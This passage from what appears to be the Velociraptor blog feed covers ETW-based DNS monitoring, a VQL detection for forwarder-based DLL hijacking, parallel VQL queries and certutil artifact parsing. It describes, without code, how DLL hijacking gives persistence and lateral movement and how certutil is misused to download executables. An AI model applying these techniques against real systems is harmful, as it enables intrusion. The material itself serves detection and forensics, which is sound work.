 &lt;a class="image-link" href="query_providers.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Querying providers on the command line
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Although it is possible to query for providers on the command line,
using APIs it is possible to dump the entire manifest containing much
more information about each provider.&lt;/p>
&lt;p>There are some public efforts to better document ETW providers, for
example &lt;a href="https://github.com/repnz/etw-providers-docs" target="_blank" >https://github.com/repnz/etw-providers-docs&lt;/a>
 contains a dump of
various manifest files. I like to search that repository to find
likely useful providers. In this case I will look for a provider that
might give DNS information. The &lt;code>Microsoft-Windows-DNS-Client&lt;/code>
provider looks like a likely candidate.&lt;/p>
&lt;p>











&lt;figure id="7194f0ed7484d9146fe23bd584be6d4c">
 &lt;div data-featherlight="#7194f0ed7484d9146fe23bd584be6d4c" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/image118.png" alt="ETW Providers documentation">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="image118.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 ETW Providers documentation
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Let&amp;rsquo;s get Velociraptor to watch the provider&amp;rsquo;s GUID for any
events. VQL provides the &lt;code>watch_etw()&lt;/code> plugin to attach Velociraptor
to the provider.&lt;/p>
&lt;pre>&lt;code class="language-sql">SELECT *
FROM watch_etw(guid=&amp;quot;{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="ab81a572d36580bc0a8aa754e4eca6a3">
 &lt;div data-featherlight="#ab81a572d36580bc0a8aa754e4eca6a3" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/watching_dns_provider.png" alt="Watching the Windows DNS Client provider">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="watching_dns_provider.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Watching the Windows DNS Client provider
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>After some trial and error we find the event ID we are interested in
as being ID 3020. We can consult with the manifest file to get more
information, such as the event data provided. Limiting the VQL query
to filter for event 3020 and extracting the most relevant columns
gives a nice DNS monitoring query:&lt;/p>
&lt;pre>&lt;code class="language-sql">SELECT System.TimeStamp AS Timestamp,
 EventData.QueryName AS Query,
 EventData.QueryType AS Type,
 EventData.QueryResults AS Answer
FROM watch_etw(guid=&amp;quot;{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}&amp;quot;)
WHERE System.ID = 3020
&lt;/code>&lt;/pre>
&lt;h2 id="deploying-the-query-on-endpoints">Deploying the query on endpoints&lt;/h2>
&lt;p>Our VQL query is able to monitor the endpoint for DNS lookups but we
need a way to deploy the query to the endpoint. In Velociraptor,
client side event queries are encapsulated in &lt;code>Client Event&lt;/code> artifacts
(Simple YAML files that include the VQL query, as well as human
readable descriptions and parameters allowing for simple
customization).&lt;/p>
&lt;p>Simply select &amp;ldquo;Add new artifact&amp;rdquo; in the &lt;code>View Artifacts&lt;/code> screen. By
default Velociraptor presents a template for an artifact definition -
ready for us to fill in the right information. Simply copy the VQL
query into the new artifact under the &lt;code>Sources.Query&lt;/code> section
(remember to indent the query to fit within the YAML format). Since
this artifact will be an event artifact running on the client, we must
specify its type as &lt;code>CLIENT_EVENT&lt;/code>&lt;/p>
&lt;p>











&lt;figure id="340634892557f7eb52f53e8ecbf27bf7">
 &lt;div data-featherlight="#340634892557f7eb52f53e8ecbf27bf7" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/event_artifact.png" alt="Adding a custom event artifact">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="event_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Adding a custom event artifact
 &lt;/figcaption>
&lt;/figure>




&lt;/p>

&lt;div class="mynotices tip">
 &lt;div heading=" The different types of artifacts ">&lt;p>What is the difference between a &lt;code>CLIENT&lt;/code> and a &lt;code>CLIENT_EVENT&lt;/code> artifact?&lt;/p>
&lt;p>A &lt;code>CLIENT&lt;/code> artifact is collected from the client, by sending a query,
having the client execute the query, returning a result set
(i.e. rows) back to the server. Therefore the &lt;code>CLIENT&lt;/code> artifact
normally has a limited lifetime (by default 10 minutes) over which to
complete its work and return a result.&lt;/p>
&lt;p>&lt;code>CLIENT_EVENT&lt;/code> artifacts are designed to run continuously on the
client, streaming rows to the server when events occur. Therefore
these are treated differently by the client: The client simply records
the event queries it is to run in a &lt;code>Client Event Table&lt;/code>.&lt;/p>
&lt;p>The client starts running all the event queries when it first
starts. If the client table changes on the server (perhaps because the
user added a new event artifact to the client), the client will resync
its event table and restart all its queries.&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>Once Velociraptor contains the new artifact it is time to deploy the
artifact to endpoints. Velociraptor can target different event
artifacts to different clients by means of &lt;code>Label Groups&lt;/code>. By simply
assigning a label to a client, we can control the event artifacts
running on the client. For example, some of our endpoints are more
sensitive so we might want to only deploy certain monitoring queries
on those clients only by labeling them as &amp;ldquo;Sensitive&amp;rdquo;.&lt;/p>
&lt;p>For our example, we will deploy the query on &lt;code>All&lt;/code> clients.&lt;/p>
&lt;p>











&lt;figure id="a156f7646ea934d2ee03a852688486c9">
 &lt;div data-featherlight="#a156f7646ea934d2ee03a852688486c9" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/adding_event_artifacts.png" alt="Targeting event monitoring to label groups">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="adding_event_artifacts.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Targeting event monitoring to label groups
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Once the query is deployed we can begin seeing any DNS events
generated on the endpoint.&lt;/p>
&lt;p>











&lt;figure id="52acb626e95187801a7cb5ef948afd43">
 &lt;div data-featherlight="#52acb626e95187801a7cb5ef948afd43" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/monitoring_dns.png" alt="Monitoring DNS requests">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="monitoring_dns.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Monitoring DNS requests
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>Hopefully you were inspired by this post to search for your own
detection queries. ETW is a rich source of endpoint state telemetry!
There are many other providers to explore and many possibilities of
combining ETW with other information sources.&lt;/p>
&lt;p>While many users are familiar with Velociraptor&amp;rsquo;s ability to collect
endpoint state and hunt for indicators at scale, the event monitoring
capability is a different approach making certain types of detections
much more convenient and effective.&lt;/p>
&lt;p>For example, many users ask &amp;ldquo;how do I schedule a hunt to run
periodically?&amp;rdquo; While there are some cases when this is a good solution,
in most cases users are trying to find out what has changed in the
endpoint&amp;rsquo;s state between two times.&lt;/p>
&lt;p>An event monitoring artifact can inform of state changes on the
endpoint and perform the preliminary triage and analysis of these
events automatically.&lt;/p>
&lt;p>In the next part of this article series we will be examining more
examples of utilizing ETW for enhancing end point visibility and
facilitating advanced response. We will also be discussing limitations
with this technique.&lt;/p>
&lt;p>If you have a great idea for a new detection query, take &lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" >Velociraptor
for a spin&lt;/a>
! It is a
available on GitHub under an open source license. As always please
file issues on the bug tracker or ask questions on our mailing list
&lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>

. You can also chat with us directly on discord
&lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>

.&lt;/p>
&lt;p>There is still time to submit it to this year&amp;rsquo;s &lt;a href="https://docs.velociraptor.app/announcements/2021-artifact-contest/" target="_blank" >2021 Velociraptor
Contributor
Competition&lt;/a>
,
where you can win prizes, honor and support the entire DFIR
community. Alternatively, you can share your artifacts with the community on
&lt;a href="https://docs.velociraptor.app/exchange/" target="_blank" >Velociraptor&amp;rsquo;s Artifact
Exchange&lt;/a>
.&lt;/p></description></item><item><title>Detecting DLL Hijacking With VQL</title><link>https://docs.velociraptor.app/blog/2021/2021-02-02-detecting-dll-hijacking-with-vql-e9a735354257/</link><pubDate>Tue, 02 Feb 2021 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2021/2021-02-02-detecting-dll-hijacking-with-vql-e9a735354257/</guid><description>&lt;p>One of my favorite pastime is reading Twitter and following other security researchers. I love being able to see a new tool or technique and develop an understanding and detections for it. A while back, I was reading my feed and saw an excellent article titled &lt;a href="https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement-part-3-dll-hijacking/" target="_blank" >I Like to Move It: Windows Lateral Movement Part 3: DLL Hijacking&lt;/a>
.&lt;/p>
&lt;p>The article describes an interesting form of lateral movement — DLL Hijacking. DLL Hijacking is an abuse of the Windows DLL search order resolution process. Typically, when an executable is started, the executable will declare dependent DLLs in its import table. Windows will search for these DLLs in a number of paths, until a suitable DLL is found, and its exported symbols will be resolved into the new image. DLL Hijacking works by placing a malicious DLL, with the same name as a legitimate DLL, in a directory that is searched earlier, thereby tricking the loader into loading the malicious DLL instead of the legitimate one.&lt;/p>
&lt;p>DLL Hijacking is often used for persistence — simply place a malicious DLL earlier in the search path, and programs that are started (potentially with higher privileges) will load the malicious DLL, thereby granting execution.&lt;/p>
&lt;p>In the above article an interesting approach is described to escalate privileges or laterally move to a remote system — simply write a malicious DLL using e.g. SMB on the target machine, and wait until a user or process on the remote machine runs the vulnerable program.&lt;/p>
&lt;p>Actually getting DLL hijacking to work successfully is &lt;a href="https://silentbreaksecurity.com/adaptive-dll-hijacking/" target="_blank" >quite tricky&lt;/a>
. The details are described well by Nick Landers in &lt;a href="https://silentbreaksecurity.com/adaptive-dll-hijacking/" target="_blank" >Adaptive DLL Hijacking&lt;/a>
 which presents a number of approaches.&lt;/p>
&lt;p>One of the simplest technique, is to simply create a DLL with a bunch of forwarded functions. Normally a DLL contains an &lt;em>Export Table&lt;/em>, listing all the functions it exports. However sometimes, the need arises to legitimately forward an export that would normally be found in one DLL to another DLL (e.g. in the case where a DLL was refactored this allows replacing the dll without rebuilding programs that depend on it).&lt;/p>
&lt;p>In this case, the export table contains a forward entry — i.e. it forwards the loader into another DLL. Nick Landers published a tool to help build such a dll &lt;a href="https://github.com/monoxgas/Koppeling" target="_blank" >https://github.com/monoxgas/Koppeling&lt;/a>
&lt;/p>
&lt;h3 id="example-injection">Example Injection&lt;/h3>
&lt;p>I will use the Koppeling tool above to build a simple DLL forwarder as per the example in the repository.&lt;/p>
&lt;p>






&lt;figure id="aa6644a3f561fd06bb4de92176853f6d">
 &lt;div data-featherlight="#aa6644a3f561fd06bb4de92176853f6d" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-02-02-detecting-dll-hijacking-with-vql-e9a735354257/../../img/1MDCiispLQZwNTqreGTQ_CQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>






&lt;figure id="900eead7a020a745fa78d61d5719b9ff">
 &lt;div data-featherlight="#900eead7a020a745fa78d61d5719b9ff" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-02-02-detecting-dll-hijacking-with-vql-e9a735354257/../../img/1w0xeBExcn4m06ja_HLFGIg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="parsing-the-dll">Parsing the DLL&lt;/h3>
&lt;p>Velociraptor has a function that allows parsing a PE file, lets see what information is available — Simply use parse_pe() on the injection file.&lt;/p>
&lt;p>






&lt;figure id="6046c71629864e834932fd613caed822">
 &lt;div data-featherlight="#6046c71629864e834932fd613caed822" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-02-02-detecting-dll-hijacking-with-vql-e9a735354257/../../img/1jogu19VYVVVeL98TDKZHNQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>We see that although the file is called &lt;strong>wkscli.dll&lt;/strong> it really is &lt;strong>kernel32.dll&lt;/strong> (since we have modified its exports to forward to the original wkscli.dll residing in C:\Windows\System32).&lt;/p>
&lt;p>While it is normal for a dll to forward to another dll, it is very unusual for a dll to forward to &lt;strong>another dll of the same name&lt;/strong>. So I think a strong signal for a potentially hijack dll is one that contains forwards to another dll with the same base name.&lt;/p>
&lt;p>As usual I created a Velociraptor notebook and developed the VQL within it. The full query I entered in the notebook cell is shown below:&lt;/p>
&lt;pre>&lt;code class="language-vql">LET Glob = '''C:\windows\**\*.dll'''

-- Apply the glob to search for matching DLLs.
LET DLLs = SELECT FullPath, Name, parse_pe(file=FullPath).Forwards AS Forwards,
 lowcase(string=parse_string_with_regex(regex=&amp;quot;^(?P&amp;lt;BareName&amp;gt;[^.]+)&amp;quot;, string=Name).BareName) AS DLLBareName
FROM glob(globs=Glob)
WHERE NOT FullPath =~ &amp;quot;(WinSXS|Servicing)&amp;quot;

-- For each DLL, extract the forward strings.
SELECT * FROM foreach(row=DLLs, workers=20,
query={
 -- For each forwarded export, split the string into
 -- a DLL path and export name
 SELECT FullPath AS DllPath, ForwardedImport,
 Parse.DllPath AS DllImportPath,
 Parse.Export AS DLLExportFunc,
 DLLBareName,
 basename(path=lowcase(string=Parse.DllPath)) AS ExportDLLName
 FROM foreach(row=Forwards,
 query={
 SELECT parse_string_with_regex(
 regex=&amp;quot;(?P&amp;lt;DllPath&amp;gt;.+)\\.(?P&amp;lt;Export&amp;gt;[^.]+$)&amp;quot;, string=_value) AS Parse,
 _value AS ForwardedImport
 FROM scope()
 })
 -- Only select forwarded functions that forward to the same dll name.
 WHERE ExportDLLName = DLLBareName
})
&lt;/code>&lt;/pre>
&lt;ol>
&lt;li>
&lt;p>First I search for all DLL files in the provided glob (excluding &lt;strong>winsxs&lt;/strong> and &lt;strong>servicing&lt;/strong> directory). I also lowercase the name of the dll and strip the extension.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>For each DLL I parse out the forwarded functions and use a regular expression to split the string into a target DLL and an exported function.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>I then filter all rows to show only those with the target DLL the same as the name of the dll itself.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="testing-the-vql">Testing the VQL&lt;/h3>
&lt;p>I copied the hijack DLL I created with &lt;a href="https://github.com/monoxgas/Koppeling" target="_blank" >Koppeling&lt;/a>
 into the Windows directory. I then created an artifact and collected it on my VM. I chose to recursively scan all dlls in the windows directory to get an idea of the performance impact.&lt;/p>
&lt;p>






&lt;figure id="9a611772afedca36fd9d5b0eaf84ceb4">
 &lt;div data-featherlight="#9a611772afedca36fd9d5b0eaf84ceb4" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-02-02-detecting-dll-hijacking-with-vql-e9a735354257/../../img/1Fcsrla6Y1rQFyBThJ-APsg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Velociraptor reports all forwarded functions that target a DLL with the same name as the one it is currently parsing. Velociraptor parsed about 9000 Dlls and took 62 seconds to find the one injection dll and one false positive (C:\Windows\SysWOW64\rpcrt4.dll).&lt;/p>
&lt;h3 id="conclusions">Conclusions.&lt;/h3>
&lt;p>This quick VQL is only suitable to detect one type of DLL hijack — one using forwarded functions. There are many other types of hijacking which might be more difficult to detect (more are discussed in the paper above). It is also possible to detect dll injection after the fact (by looking at loaded DLLs in process memory images), but this query is looking for “time bombs” — simply files that stay on the endpoint until a time in the future where they allow reinfection or escalation.&lt;/p>
&lt;p>In this exercise we went from a blog post and a POC tool to a detection artifact in a short time, and were able to easily deploy and subsequently hunt for these.&lt;/p>
&lt;p>The above example is just one of the exercises we do in our hands on Velociraptor courses. If you are interested in learning more about Velociraptor, check out our hands on training courses on &lt;a href="https://www.velocidex.com/training/" target="_blank" >https://www.velocidex.com/training/&lt;/a>
 or check out the code on &lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" >GitHub&lt;/a>
. To chat, please join us on discord &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
.&lt;/p></description></item><item><title>Concurrent VQL</title><link>https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/</link><pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/</guid><description>&lt;p>






&lt;figure id="2b2aa3a389c2836e220d4f5d271a994b">
 &lt;div data-featherlight="#2b2aa3a389c2836e220d4f5d271a994b" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/0O-0AL55-9dX4uKDn?width=600px" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Velociraptor’s special source is really the Velociraptor Query Language (VQL). Using VQL allows administrators to query their endpoints and respond to new threats quickly and flexibly.&lt;/p>
&lt;p>VQL was always intended to be a simple query language which users could pick up in a matter of hours, while being powerful at the same time. We never intended VQL to be a full blown programming language. Nevertheless, performance is a critical feature of VQL, simply because queries typically need to process large amount of data quickly. The challenge is how to expose powerful multithreaded programming concepts to VQL’s simple model of operation.&lt;/p>
&lt;p>In this blog post we explore one of the new performance features that allow users to harness the full processing power of their platform.&lt;/p>
&lt;h3 id="simple-example-hash-every-file">Simple example: hash every file&lt;/h3>
&lt;p>Let’s consider a simple use case — hash every file on the system. I wrote a simple query to simply glob recursively through the filesystem, and for each file found calculate its hash.&lt;/p>
&lt;p>To test this query I ran it in a notebook within the Velociraptor GUI.&lt;/p>
&lt;p>






&lt;figure id="f771165100d274b9310d53e215dd760e">
 &lt;div data-featherlight="#f771165100d274b9310d53e215dd760e" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/1lKdoOeFNUK3S0Jfoc5hjAg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>This query is simple to understand, and fits the mental model of VQL: The glob() plugin searches the filesystem for files matching the glob expression (wildcards) and emits a single row per matched file. The query then processes each of these rows and passes the path to the hash() function which returns the hash.&lt;/p>
&lt;p>When I ran the above query on my system, I kept an eye on my CPU activity monitor applet and I could see a single core spiking, but most of my other cores were idle (This is a 24 core machine).&lt;/p>
&lt;p>






&lt;figure id="fc8994254f40ecb8805586bf4444c40e">
 &lt;div data-featherlight="#fc8994254f40ecb8805586bf4444c40e" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/1AqHCS0ooUVU6uu_d1MbwQA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>After a while, the query completes and I get the results (There were 4700 files hashed) and it took 46 second overall.&lt;/p>
&lt;p>






&lt;figure id="d612b03631845cf90c1eb27c0ecd26dc">
 &lt;div data-featherlight="#d612b03631845cf90c1eb27c0ecd26dc" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/1_x-w8bzPKcgDxIpemcuAvg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>While this is satisfactory, I was a bit worried about my idle cores . This simple query was unable to fully utilize the processing capacity of my machine because the query was essentially sequential — each row was hashed in turn, before hashing the next row.&lt;/p>
&lt;p>In this case, 46 seconds is not too bad, but if I wanted to hash the entire hard disk (as opposed to the &lt;strong>/usr/bin&lt;/strong> directory) it could take a very long time.&lt;/p>
&lt;h3 id="run-the-hash-in-parallel">Run the hash in parallel&lt;/h3>
&lt;p>My query receives its file names from the glob() plugin which is very fast — clearly the performance blockage in my query is the &lt;strong>hash&lt;/strong> function which is CPU intensive. I would therefore love to have a hash operation sent to each core in parallel, then all my cores will be recruited and the query will run faster.&lt;/p>
&lt;p>Since Velociraptor 0.5.5, the foreach() plugin has an additional “workers” parameter. Readers who use Velociraptor extensively are familiar with the foreach() plugin, as it is probably the most common plugin in use. We also covered it in detail in an earlier blog post, &lt;a href="https://medium.com/velociraptor-ir/the-velociraptor-query-language-pt-2-fe92bb7aa150" target="_blank" >here&lt;/a>
.&lt;/p>
&lt;p>In a nutshell, the foreach() plugin takes 2 parameters. The “row” parameter is another query which will be run, taking each row produced by it. The “query” parameter is another query which will be evaluated with a nested scope containing the row obtained (Conceptually, the foreach plugin acts in a similar way to the SQL JOIN operator).&lt;/p>
&lt;p>For example the above query can be refactored to&lt;/p>
&lt;p>






&lt;figure id="aaecb49d116a186e79613a4e695a2452">
 &lt;div data-featherlight="#aaecb49d116a186e79613a4e695a2452" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/1yQZMsoGUDzFNoHNBDvqXSg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>The “row” query simply calls the glob() plugin and extracts the FullPath of each file matching the wildcards. The foreach() plugin will take that row and evaluate the query on the scope (therefore evaluating the hash() function).&lt;/p>
&lt;p>This still does not buy us very much because each row is still processed in sequence one after the other.&lt;/p>
&lt;p>In 0.5.5 the foreach() plugin has the “workers” parameter: This allows the plugin to create workers in a pool, and send them each row in parallel. While the “row” query is still evaluated sequentially, the “query” query will now be evaluated on a worker pool in a separate thread.&lt;/p>
&lt;p>






&lt;figure id="0f4e2df9b24a4215c1dd752764b73f3b">
 &lt;div data-featherlight="#0f4e2df9b24a4215c1dd752764b73f3b" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/1g18d_ZqooGZyGFtBVgTpFg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>This time when I run the query, my CPU load applet lights up — all cores are busy!&lt;/p>
&lt;p>






&lt;figure id="4b33c7a9827ceb7b517920ebc8cd49e9">
 &lt;div data-featherlight="#4b33c7a9827ceb7b517920ebc8cd49e9" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/1WW4I3UqyHiQ5oisTojx5mw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>The same query now takes 6 seconds instead of 46 seconds! A factor of 8 times faster.&lt;/p>
&lt;p>






&lt;figure id="e657e3e2b26b8741a66b8a5c28f536ea">
 &lt;div data-featherlight="#e657e3e2b26b8741a66b8a5c28f536ea" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/1UON1jBo_919hBi9LMn-QJw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>This query was particularly suitable for parallelization because the CPU intensive operation was done on each row (hashing) but generating the rows themselves is very quick (globbing).&lt;/p>
&lt;h3 id="other-use-cases">Other use cases&lt;/h3>
&lt;p>In 0.5.5, Velociraptor’s offline collector now uses the above technique to upload multiple files simultaneously into the collection Zip file. Coupled with a multithreaded Zip writer implementation this allows parallel compression of many files at once — speeding up acquisition on most machines. The below screenshot shows the collector making good use of CPU resources during acquisition with a significant speed up.&lt;/p>
&lt;p>






&lt;figure id="8c7394772d979d8849d1cfcc6a14d4be">
 &lt;div data-featherlight="#8c7394772d979d8849d1cfcc6a14d4be" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/../../img/1t5DedninX180zBSrNIv1dA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="thoughts-about-design">Thoughts about design&lt;/h3>
&lt;p>Many users when they first are introduced to VQL ask me about the “query optimizer/planner”. I guess this is because VQL is very similar to SQL in syntax. However, VQL does not have any query rewriting behind the scenes — with VQL what you write is what you get!&lt;/p>
&lt;p>I feel that having some magic box rewrite your query behind your back is suboptimal — people have to constantly run “explain” to try to figure out what the optimizer/planner is going to do to their query and then try to rewrite their query in non-obvious ways to provide hints to the optimizer to get it to do what they actually wanted it to do. This adds complexity to the language and makes it more difficult to use.&lt;/p>
&lt;p>In VQL, if you wanted more performance, you can do it by structuring your query — Velociraptor is not going to second guess what you wanted to do.&lt;/p>
&lt;p>Additionally, extra performance may not always be what you want. If my goal was to hash the entire filesystem on an endpoint, I typically do not want the endpoint to use all its resources, because this may negatively impact the end user. For a machine with many cores, having a single core hash every file for a few hours is much less impactful or noticeable than all cores saturating, even for a short time.&lt;/p>
&lt;p>For these reasons parallelism in VQL is opt in — users have to structure their query to take advantage of it. The language remains simple and easy to use with a predictable model for how it works.&lt;/p>
&lt;p>To play with this feature yourself, take&lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" > Velociraptor for a spin&lt;/a>
! It is a available on GitHub under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list &lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>
 . You can also chat with us directly on discord &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
&lt;/p>
&lt;p>If you want to know more about Velociraptor, VQL and how to use it effectively to hunt across the enterprise, consider enrolling for the next available training course at &lt;a href="https://www.velocidex.com/training/" target="_blank" >https://www.velocidex.com/training/&lt;/a>
.&lt;/p></description></item><item><title>Parsing binary files</title><link>https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/</link><pubDate>Tue, 19 Jan 2021 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/</guid><description>&lt;p>






&lt;figure id="04e6484cb069f50f7daf5fd935e53fab">
 &lt;div data-featherlight="#04e6484cb069f50f7daf5fd935e53fab" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/05guWyV7JU51Gcg3T?width=600px" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>During the course of our DFIR work, we typically need to extract some
information from endpoints from various files and registry keys on the
system. Sometimes it is possible to extract the needed information
using text processing tools — such as a regular expression applied on
a configuration file.&lt;/p>
&lt;p>In many cases however, the information we need is encoded inside a
binary file. A large part of DFIR analysis involves parsing binary
structures from files, registry keys and even event logs.&lt;/p>
&lt;p>While it is always possible to write a dedicated parser for whatever
file format we are interested in, this leads to operational
complexities — if we download an adhoc parser for a particular file
format, how do we push new program or script to the endpoint? how to
ensure it has any dependencies (e.g. Python, .NET etc)?&lt;/p>
&lt;p>The entire premise of VQL is that users should be able to rapidly
issue new queries to the endpoint, in a consistent and easy to learn
way. Wouldn’t it be great if users can parse binary files directly in
VQL without needing to use external programs?&lt;/p>
&lt;p>As of Velociraptor 0.5.5, VQL contains a powerful new built in binary
parser. This post introduces the new parser and shows a practical
example of using it to develop a powerful Velociraptor artifact.&lt;/p>
&lt;h3 id="binary-parsing-overview">Binary parsing overview.&lt;/h3>
&lt;p>Binary files store information for machine consumption — this is termed serialization. Ultimately serialization is a way to represent data as binary digits by encoding integers, structs and other concepts into a binary representation.&lt;/p>
&lt;p>While it is certainly possible to write parsers that procedurally unpack various bits of data from the file, these are typically hard to maintain and understand. It is better to visualize what the data actually means and how it is laid onto the file. Therefore we want to write parsers in a descriptive way rather than procedural — Ideally we want the parser to be easy to understand and maintain.&lt;/p>
&lt;p>Velociraptor’s binary parser has taken inspiration from other great parsers, such as Volatility and Rekall’s Vtype system (with some syntax simplification).&lt;/p>
&lt;p>The best way to introduce the new parser is with an example so I will jump straight in!&lt;/p>
&lt;h3 id="certutil-metadata-parsing">&lt;code>Certutil&lt;/code> metadata parsing&lt;/h3>
&lt;p>The &lt;code>certutil&lt;/code> program is a native, built in Windows tool used to download certificate information. It is a commonly used &lt;a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/" target="_blank" >Lolbin&lt;/a>
, with attackers misusing the tool to download malicious code to compromised endpoints (see &lt;a href="https://attack.mitre.org/software/S0160/" target="_blank" >Att&amp;amp;ck S0160&lt;/a>
).&lt;/p>
&lt;p>I was reading an excellent blog post recently titled &lt;a href="https://u0041.co/blog/post/3" target="_blank" >&lt;code>Certutil&lt;/code> Artifacts Analysis&lt;/a>
 where &lt;code>Aalfaifi&lt;/code> analyses the forensic evidence left behind by &lt;code>certutil&lt;/code>. Let’s write a parser for this!&lt;/p>
&lt;p>We start off by using &lt;code>certutil&lt;/code> in a malicious way — rather than downloading certificate revocation lists we will download an executable to the system for testing.&lt;/p>
&lt;p>






&lt;figure id="c1f5f2f768f59f8f9ddc5736b7b1181f">
 &lt;div data-featherlight="#c1f5f2f768f59f8f9ddc5736b7b1181f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/1c9DTl-Q04OAFY9T6CUidfw.png" alt="" />
 &lt;/div>
